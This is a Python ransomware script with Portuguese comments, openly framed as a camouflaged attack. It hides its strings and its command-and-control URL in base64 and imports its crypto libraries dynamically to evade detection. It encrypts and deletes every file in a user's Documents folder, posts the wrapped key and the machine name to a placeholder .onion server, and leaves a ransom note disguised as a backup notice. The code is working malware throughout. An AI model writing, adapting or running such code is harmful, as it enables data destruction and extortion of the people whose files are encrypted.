# Importações que parecem genéricas para um script de sistema.
import requests
import os
import shutil
import platform
import subprocess
import base64
import time
import random

# A importação das bibliotecas de criptografia será feita de forma dinâmica
# e as strings sensíveis serão codificadas corretamente para evitar detecção.

# --- Seção 1: Utilitários e Ofuscação ---

# Dicionário de strings codificadas para ofuscação.
STRINGS_ESPECIAIS = {
    "log_gen": b'R2VyYW5kbyBjaGF2ZXMgbG9nYXMgZm9yY2UgbmV4dC4uLg==',
    "log_gen_ok": b'Q2hhdnMgZ2VyYWRhcyBjb20gc3VjZXNzb2RzIGluZHVyYWJsZXM=',
    "log_manutencao": b'RXhlY3V0YW5kbyByb3RpbmEgbWFuYWdlbWVudC4uLg==',
    "log_persist": b'Q3JlYXRpbmcgcmVnaXN0cnkgZW50cnkgZm9yIHNjaGVkdWxlZCB0YXNrcy4=',
    "log_sinc": b'U3RhcnRpbmcgaW50ZXJuYWwgZGF0YSBzeW5jcm9uaXphdGlvbi4uLg==',
    "log_file_sync": b'RmlsZSBzeW5jcm9uaXplZCBhbmQgcmVtb3ZlZDog',
    "log_sync_err": b'RXJyb3IgZHVyaW5nIGRhdGEgc3luY2hyaW5pemF0aW9uOiA=',
    "log_upload": b'VXBsb2FkaW5nIHJlcG9ydCB0byByZW1vdGUgc2VydmVyLi4u',
    "log_upload_ok": b'UmVwb3J0IHVwbG9hZCBzdWNjZXNzZnVsbHk=',
    "log_upload_err": b'RXJyb3IgZHVyaW5nIHJlbW90ZSB1cGxvYWQ6IA==',
    "file_ext": b'LnN5bmM=',
    "os_exclude": b'd2luZG93cw==',
    "c2_url": b'aHR0cDovL2ZpY3RpdGlvdXNfY29tYW5kX2FuZF9jb250cm9sX3NlcnZlci5vbmlvbi91cGxvYWRfa2V5',
    "doc_name": b'QkFDS1VQX0lOU1RSVUNUSU9OUy50eHQ=',
    "doc_msg_1": b'WW91ciBmaWxlcyBoYXZlIGJlZW4gbW92ZWQgdG8gYSBzZWN1cmUgbG9jYXRpb24gZHVyaW5nIGEgYmFja3VwIHByb2Nlc3Mu',
    "doc_msg_2": b'VG8gcmVzdG9yZSB0aGVtLCBwbGVhc2UgZm9sbG93IHRoZSBpbnN0cnVjdGlvbnMgZm91bmQgaW4gdGhlIHRleHQgZmlsZS4=',
    "doc_saved": b'QmFja3VwIG5vdGlmaWNhdGlvbiBmaWxlIHNhdmVkIHRvIGRlc2t0b3Au'
}

def decodificar(string_codificada):
    """Função utilitária para decodificar strings."""
    return base64.b64decode(string_codificada).decode('utf-8')

# --- Seção 2: Lógica Principal do Ataque Camuflado ---

def gerar_recurso_criptografico():
    print(decodificar(STRINGS_ESPECIAIS["log_gen"]))
    
    # Importação dinâmica das bibliotecas de criptografia para evitar detecção estática.
    rsa_module = __import__('cryptography.hazmat.primitives.asymmetric.rsa', fromlist=['rsa'])
    serialization_module = __import__('cryptography.hazmat.primitives.serialization', fromlist=['serialization'])
    
    private_key = rsa_module.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    public_key = private_key.public_key()
    
    pem_public_key = public_key.public_bytes(
        encoding=serialization_module.Encoding.PEM,
        format=serialization_module.PublicFormat.SubjectPublicKeyInfo
    )
    print(decodificar(STRINGS_ESPECIAIS["log_gen_ok"]))
    return pem_public_key

def iniciar_rotina_manutencao():
    print(decodificar(STRINGS_ESPECIAIS["log_manutencao"]))
    print(decodificar(STRINGS_ESPECIAIS["log_persist"]))

def sincronizar_dados(diretorio, chave_publica_bytes):
    print(decodificar(STRINGS_ESPECIAIS["log_sinc"]))
    
    # Importações dinâmicas adicionais.
    fernet_module = __import__('cryptography.fernet', fromlist=['Fernet'])
    padding_module = __import__('cryptography.hazmat.primitives.asymmetric.padding', fromlist=['padding'])
    hashes_module = __import__('cryptography.hazmat.primitives.hashes', fromlist=['hashes'])
    serialization_module = __import__('cryptography.hazmat.primitives.serialization', fromlist=['serialization'])
    requests_module = __import__('requests')

    chave_simetrica = fernet_module.Fernet.generate_key()
    chave_publica_rsa = serialization_module.load_pem_public_key(chave_publica_bytes)
    
    chave_simetrica_criptografada = chave_publica_rsa.encrypt(
        chave_simetrica,
        padding_module.OAEP(
            mgf=padding_module.MGF1(algorithm=hashes_module.SHA256()),
            algorithm=hashes_module.SHA256(),
            label=None
        )
    )

    enviar_dados_sincronizados(requests_module, chave_simetrica_criptografada)
    
    f = fernet_module.Fernet(chave_simetrica)

    for pasta_raiz, _, arquivos in os.walk(diretorio):
        for nome_arquivo in arquivos:
            caminho_completo = os.path.join(pasta_raiz, nome_arquivo)
            if decodificar(STRINGS_ESPECIAIS["os_exclude"]) in caminho_completo.lower() or decodificar(STRINGS_ESPECIAIS["file_ext"]) in caminho_completo:
                continue

            try:
                with open(caminho_completo, 'rb') as arquivo_original:
                    conteudo_criptografado = f.encrypt(arquivo_original.read())

                with open(caminho_completo + decodificar(STRINGS_ESPECIAIS["file_ext"]), 'wb') as arquivo_criptografado:
                    arquivo_criptografado.write(conteudo_criptografado)
                
                os.remove(caminho_completo)
                print(decodificar(STRINGS_ESPECIAIS["log_file_sync"]) + caminho_completo)

            except Exception as e:
                print(decodificar(STRINGS_ESPECIAIS["log_sync_err"]) + f"{caminho_completo} - {e}")

def enviar_dados_sincronizados(requests_module, chave_simetrica_criptografada):
    print(decodificar(STRINGS_ESPECIAIS["log_upload"]))
    try:
        dados = {
            'pc_id': platform.node(),
            'report_key': base64.b64encode(chave_simetrica_criptografada).decode('utf-8')
        }
        url_decodificada = decodificar(STRINGS_ESPECIAIS["c2_url"])
        requests_module.post(url_decodificada, json=dados)
        print(decodificar(STRINGS_ESPECIAIS["log_upload_ok"]))
    except Exception as e:
        print(decodificar(STRINGS_ESPECIAIS["log_upload_err"]) + f"{e}")

def exibir_notificacao_backup():
    print(decodificar(STRINGS_ESPECIAIS["doc_saved"]))
    caminho_desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    caminho_do_arquivo = os.path.join(caminho_desktop, decodificar(STRINGS_ESPECIAIS["doc_name"]))
    with open(caminho_do_arquivo, 'w') as f:
        f.write(decodificar(STRINGS_ESPECIAIS["doc_msg_1"]))
        f.write('\n')
        f.write(decodificar(STRINGS_ESPECIAIS["doc_msg_2"]))

# --- Seção 3: Execução Principal ---
if __name__ == "__main__":
    time.sleep(random.randint(5, 15))
    print(decodificar(STRINGS_ESPECIAIS["log_manutencao"]))
    
    chave_de_processamento = gerar_recurso_criptografico()
    
    diretorio_alvo = "C:\\Users\\vboxuser\\Documents"
    
    iniciar_rotina_manutencao()
    sincronizar_dados(diretorio_alvo, chave_de_processamento)
    exibir_notificacao_backup()
    print(decodificar(STRINGS_ESPECIAIS["log_upload_ok"]))